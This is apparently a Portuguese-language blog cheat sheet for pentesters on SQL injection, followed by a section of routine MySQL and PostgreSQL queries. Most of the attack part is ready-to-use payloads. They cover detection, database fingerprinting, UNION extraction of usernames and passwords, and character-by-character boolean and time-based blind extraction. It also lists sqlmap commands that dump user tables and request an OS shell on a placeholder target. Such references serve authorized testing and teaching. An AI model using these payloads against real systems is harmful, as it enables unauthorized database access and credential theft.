---
title: "SQL Injection e Consultas de Banco de Dados: Referência para Pentesters"
description: "Payloads de SQL injection, ataques UNION, técnicas de blind SQLi e consultas padrão para MySQL e PostgreSQL. Uma referência tática para pentesters e administradores de banco de dados."
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["payloads sql injection", "cheatsheet comandos mysql", "cheat sheet postgresql", "hacking de banco de dados", "comandos sqlmap", "union sql injection", "blind sql injection", "testes sql injection", "enumeração de banco de dados", "prevenção sql injection"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQL Injection e Consultas de Banco de Dados: Referência para Pentesters",
    "description": "Payloads de SQL injection, ataques UNION, blind SQLi e consultas para MySQL e PostgreSQL.",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "pt"
  }
---

## Inicialização do Sistema

A SQL injection continua sendo uma das vulnerabilidades mais críticas em aplicações web — consistentemente classificada no OWASP Top 10. Ela ocorre quando a entrada do usuário é concatenada diretamente nas consultas SQL sem a devida sanitização, permitindo que um atacante manipule a lógica da consulta ao banco de dados. Uma SQL injection bem-sucedida pode levar à exfiltração completa de dados, bypass de autenticação, escalação de privilégios e, em alguns casos, execução remota de comandos no servidor do banco de dados. Este manual de campo fornece tanto os payloads ofensivos para testes de penetração autorizados quanto as consultas SQL padrão que todo administrador de banco de dados precisa conhecer.

Todas as técnicas de injection são exclusivamente para testes autorizados. O acesso não autorizado é ilegal.

---

## Detecção de SQLi

Antes de explorar uma vulnerabilidade de SQL injection, você precisa confirmar que ela existe. A detecção envolve enviar entradas especialmente criadas para os parâmetros da aplicação e observar a resposta em busca de mensagens de erro, mudanças de comportamento ou diferenças de tempo. Essas sondas iniciais indicam se o parâmetro é injetável e qual tipo de injection é possível.

### Payloads de detecção básicos

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Identificar o backend do banco de dados

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## Ataques UNION

A SQL injection baseada em UNION é a técnica mais poderosa quando mensagens de erro ou resultados de consultas são exibidos na página. Funciona adicionando uma instrução `UNION SELECT` à consulta original, permitindo extrair dados de qualquer tabela do banco de dados. O requisito principal é determinar o número correto de colunas na consulta original para que a instrução UNION corresponda.

### Determinar o número de colunas

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### Extrair dados

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## Blind SQL Injection

Quando a aplicação não exibe os resultados das consultas nem as mensagens de erro na página, você está lidando com blind SQL injection. A vulnerabilidade ainda existe, mas a extração de dados requer inferência — seja por condições booleanas (a página muda?) ou atrasos de tempo (a resposta demora mais?). A blind SQLi é mais lenta, mas igualmente perigosa.

### Blind baseada em booleanos

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### Blind baseada em tempo

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## Automação com SQLMap

SQLMap é a ferramenta padrão da indústria para detecção e exploração automatizada de SQL injection. Ele gerencia detecção, fingerprinting, extração de dados e até acesso em nível de sistema operacional através de SQL injection — tudo pela linha de comando. Para testes de penetração autorizados, ele acelera drasticamente a fase de exploração.

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## Consultas SQL Padrão

Além dos testes de injection, todo profissional de segurança e desenvolvedor precisa conhecer SQL padrão para administração de banco de dados, análise de logs e extração de dados durante investigações. Estas consultas funcionam tanto no MySQL quanto no PostgreSQL e cobrem as operações de banco de dados mais comuns.

### Consultas SELECT

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### Consultas JOIN

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT, UPDATE, DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### Administração do banco de dados

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
